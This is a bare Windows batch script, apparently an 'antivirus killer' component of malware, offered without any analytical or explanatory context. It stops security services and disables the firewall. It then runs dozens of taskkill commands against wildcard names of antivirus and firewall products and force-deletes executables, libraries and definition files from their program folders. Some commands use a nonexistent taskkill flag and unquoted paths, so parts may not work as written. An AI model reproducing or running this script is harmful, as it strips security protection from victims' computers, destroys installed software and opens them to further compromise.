@ echo off
net stop "symantec antivirus"
net stop “Security Center”
netsh firewall set opmode mode=disable
taskkill /A av*
taskkill /A fire*
taskkill /A anti*
cls
taskkill /A spy*
taskkill /A bullguard
taskkill /A PersFw
taskkill /A KAV*
taskkill /A ZONEALARM
taskkill /A SAFEWEB
cls
taskkill /A OUTPOST
taskkill /A nv*
taskkill /A nav*
taskkill /A F-*
taskkill /A ESAFE
taskkill /A cle
cls
taskkill /A BLACKICE
taskkill /A def*
taskkill /A kav
taskkill /A kav*
taskkill /A avg*
taskkill /A ash*
cls
taskkill /A aswupdsv
taskkill /A ewid*
taskkill /A guard*
taskkill /A guar*
taskkill /A gcasDt*
taskkill /A msmp*
cls
taskkill /A mcafe*
taskkill /A mghtml
taskkill /A msiexec
taskkill /A outpost
taskkill /A isafe
taskkill /A zap*
cls
taskkill /A zauinst
taskkill /A upd*
taskkill /A zlclien*
taskkill /A minilog
taskkill /A cc*
taskkill /A norton*
cls
taskkill /A norton au*
taskkill /A ccc*
taskkill /A npfmn*
taskkill /A loge*
taskkill /A nisum*
taskkill /A issvc
taskkill /A tmp*
cls
taskkill /A tmn*
taskkill /A pcc*
taskkill /A cpd*
taskkill /A pop*
taskkill /A pav*
taskkill /A padmin
cls
taskkill /A panda*
taskkill /A avsch*
taskkill /A sche*
taskkill /A syman*
taskkill /A virus*
taskkill /A realm*
cls
taskkill /A sweep*
taskkill /A scan*
taskkill /A ad-*
taskkill /A safe*
taskkill /A avas*
taskkill /A norm*
cls
taskkill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
cls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
del /Q /F C:\Program Files\avgamsvr\*.exe
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
del /Q /F C:\Program Files\avgupsvc\*.exe
del /Q /F C:\Program Files\grisoft
del /Q /F C:\Program Files\nood32krn\*.exe
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe
del /Q /F C:\Program Files\kavmm\*.exe
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
del /Q /F C:\Program Files\guard\*.exe
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
del /Q /F C:\Program Files\pavprot\*.exe
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
del /Q /F C:\Program Files\webproxy\*.exe
del /Q /F C:\Program Files\pandasoftware\*.*
netsh firewall set opmode mode=enable
exit
